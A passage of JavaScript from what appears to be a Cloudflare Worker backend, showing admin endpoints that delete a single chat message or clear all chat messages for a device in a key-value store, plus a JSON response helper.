      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID, msgId } = body;
      if (!deviceID || !msgId) return json({ error: 'Missing deviceID or msgId' }, corsHeaders, 400);
      const chatKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(chatKey);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      const before = (record.messages || []).length;
      record.messages = (record.messages || []).filter(m => m.id !== msgId);
      if (record.messages.length === before) return json({ error: 'Message not found' }, corsHeaders, 404);
      await env.KEYS_KV.put(chatKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 90 });
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/chat/clear — Xóa toàn bộ chat của 1 device ───────
    if (url.pathname === '/api/admin/chat/clear' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID } = body;
      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);
      const chatKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(chatKey);
      if (!raw) return json({ success: true }, corsHeaders);
      const record = JSON.parse(raw);
      record.messages = [];
      record.lastUserMsg = null;
      record.lastAdminReply = null;
      await env.KEYS_KV.put(chatKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 90 });
      return json({ success: true }, corsHeaders);
    }

    return json({ error: 'Not found' }, corsHeaders, 404);
  }
};

function json(data, headers = {}, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', ...headers }
  });
}
